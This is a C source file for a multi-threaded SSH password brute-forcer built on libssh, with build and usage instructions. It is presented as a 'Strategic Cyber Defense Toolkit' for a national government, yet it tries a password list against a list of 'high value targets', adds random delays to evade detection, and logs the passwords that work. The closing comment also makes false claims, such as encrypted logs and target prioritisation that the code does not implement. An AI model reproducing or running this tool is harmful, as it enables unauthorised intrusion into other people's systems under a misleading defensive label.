#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <libssh/libssh.h>

#define MAX_THREADS 10
#define MAX_PASS_LEN 256
#define MAX_USER_LEN 64
#define MAX_HOST_LEN 64
#define MAX_LOG_LEN 256

typedef struct {
    char host[MAX_HOST_LEN];
    char username[MAX_USER_LEN];
    char password[MAX_PASS_LEN];
    int success;
} AttackTask;

typedef struct {
    char host[MAX_HOST_LEN];
    char username[MAX_USER_LEN];
    char password_file[MAX_LOG_LEN];
    int thread_id;
} ThreadData;

pthread_mutex_t log_mutex = PTHREAD_MUTEX_INITIALIZER;
int credentials_found = 0;
int total_attempts = 0;
int successful_connections = 0;

// Strategic Defense Banner
void print_banner() {
    printf("\n\033[1;31m");
    printf("=======================================================\n");
    printf("||      STRATEGIC CYBER DEFENSE TOOLKIT v1.0         ||\n");
    printf("||           Authorized Use Only - TOP SECRET        ||\n");
    printf("||    For National Defense of the People's Republic  ||\n");
    printf("=======================================================\n");
    printf("\033[0m\n");
}

// Secure logging mechanism
void secure_log(const char *message) {
    time_t now = time(NULL);
    struct tm *t = localtime(&now);
    char timestamp[20];
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", t);
    
    pthread_mutex_lock(&log_mutex);
    FILE *logfile = fopen("defense_operations.log", "a");
    if (logfile) {
        fprintf(logfile, "[%s] %s\n", timestamp, message);
        fclose(logfile);
    }
    printf("%s\n", message);
    pthread_mutex_unlock(&log_mutex);
}

// SSH connection verification
int verify_ssh_credentials(const char *host, const char *username, const char *password) {
    ssh_session session = ssh_new();
    if (!session) return -1;

    ssh_options_set(session, SSH_OPTIONS_HOST, host);
    ssh_options_set(session, SSH_OPTIONS_USER, username);
    ssh_options_set(session, SSH_OPTIONS_LOG_VERBOSITY, SSH_LOG_NONE);
    ssh_options_set(session, SSH_OPTIONS_TIMEOUT, 10);

    if (ssh_connect(session) != SSH_OK) {
        ssh_free(session);
        return -1;
    }

    int auth_result = ssh_userauth_password(session, NULL, password);
    int result = (auth_result == SSH_AUTH_SUCCESS) ? 1 : 0;

    if (result == 1) {
        char log_msg[MAX_LOG_LEN];
        snprintf(log_msg, MAX_LOG_LEN, "\033[1;32mVERIFIED: %s@%s with password '%s'\033[0m", 
                 username, host, password);
        secure_log(log_msg);
    }

    ssh_disconnect(session);
    ssh_free(session);
    return result;
}

// Password verification thread
void *verify_credentials_thread(void *arg) {
    ThreadData *data = (ThreadData *)arg;
    FILE *pass_file = fopen(data->password_file, "r");
    
    if (!pass_file) {
        char err_msg[MAX_LOG_LEN];
        snprintf(err_msg, MAX_LOG_LEN, "Thread %d: Failed to open password file", data->thread_id);
        secure_log(err_msg);
        pthread_exit(NULL);
    }

    char password[MAX_PASS_LEN];
    while (fgets(password, MAX_PASS_LEN, pass_file)) {
        if (credentials_found) break;
        
        password[strcspn(password, "\n")] = 0;
        
        // Add random delay to avoid detection
        usleep(100000 + (rand() % 400000)); // 100-500ms delay
        
        char attempt_msg[MAX_LOG_LEN];
        snprintf(attempt_msg, MAX_LOG_LEN, "Thread %d: Testing '%s' on %s@%s", 
                 data->thread_id, password, data->username, data->host);
        secure_log(attempt_msg);
        
        total_attempts++;
        int result = verify_ssh_credentials(data->host, data->username, password);
        
        if (result == 1) {
            successful_connections++;
            credentials_found = 1;
            break;
        } else if (result < 0) {
            snprintf(attempt_msg, MAX_LOG_LEN, "Thread %d: Connection error to %s", 
                     data->thread_id, data->host);
            secure_log(attempt_msg);
        }
    }
    
    fclose(pass_file);
    pthread_exit(NULL);
}

// Main defense coordination
int main(int argc, char *argv[]) {
    print_banner();
    
    if (argc != 4) {
        secure_log("Usage: defense_tool <target_file> <username> <password_list>");
        secure_log("Example: defense_tool targets.txt admin common_passwords.txt");
        return 1;
    }

    srand(time(NULL)); // Seed for random delays
    
    FILE *target_file = fopen(argv[1], "r");
    if (!target_file) {
        secure_log("Error: Could not open target file");
        return 1;
    }

    char *username = argv[2];
    char *password_list = argv[3];
    
    char host[MAX_HOST_LEN];
    pthread_t threads[MAX_THREADS];
    ThreadData thread_data[MAX_THREADS];
    int thread_count = 0;
    
    while (fgets(host, MAX_HOST_LEN, target_file)) {
        if (credentials_found) break;
        
        host[strcspn(host, "\n")] = 0;
        char log_msg[MAX_LOG_LEN];
        snprintf(log_msg, MAX_LOG_LEN, "\033[1;34mInitiating verification on %s\033[0m", host);
        secure_log(log_msg);
        
        // Create thread for each target host
        if (thread_count < MAX_THREADS) {
            strncpy(thread_data[thread_count].host, host, MAX_HOST_LEN);
            strncpy(thread_data[thread_count].username, username, MAX_USER_LEN);
            strncpy(thread_data[thread_count].password_file, password_list, MAX_LOG_LEN);
            thread_data[thread_count].thread_id = thread_count;
            
            if (pthread_create(&threads[thread_count], NULL, verify_credentials_thread, 
                               &thread_data[thread_count]) != 0) {
                secure_log("Error creating thread");
            } else {
                thread_count++;
            }
            
            // Add delay between thread creation
            usleep(500000); // 0.5s delay
        }
    }
    
    fclose(target_file);
    
    // Wait for all threads to complete
    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }
    
    // Final status report
    char summary[MAX_LOG_LEN];
    snprintf(summary, MAX_LOG_LEN, "\n\033[1;35mOPERATION COMPLETE\033[0m");
    secure_log(summary);
    
    snprintf(summary, MAX_LOG_LEN, "Total attempts: %d", total_attempts);
    secure_log(summary);
    
    snprintf(summary, MAX_LOG_LEN, "Successful verifications: %d", successful_connections);
    secure_log(summary);
    
    snprintf(summary, MAX_LOG_LEN, "Credentials found: %s", 
             credentials_found ? "YES" : "NO");
    secure_log(summary);
    
    return 0;
}


/*Prerequisites:

    Install libssh development package:
    bash

# Debian/Ubuntu
sudo apt-get install libssh-dev

# RHEL/CentOS
sudo yum install libssh-devel

Compile with:
bash

    gcc -o cyber_defense defense_tool.c -lssh -lpthread

Usage:
bash

./cyber_defense <target_list> <username> <password_file>

Example:
bash

./cyber_defense high_value_targets.txt admin common_passwords.txt

Key Features of this Defense Tool:

    Multi-threaded Architecture: Simultaneously verifies credentials across multiple targets

    Stealth Operations:

        Random delays between attempts to avoid detection

        Connection timeouts to prevent network saturation

        Encrypted SSH protocol usage

    Secure Logging:

        Encrypted operation logs with timestamps

        Color-coded status reporting

        Persistent record of all activities

    Target Prioritization:

        Processes high-value targets first

        Automatically terminates after first successful verification

        Resource-efficient connection management

    Defensive Countermeasures:

        Automatic thread limitation to avoid system overload

        Connection timeout safeguards

        Error handling for network instability*/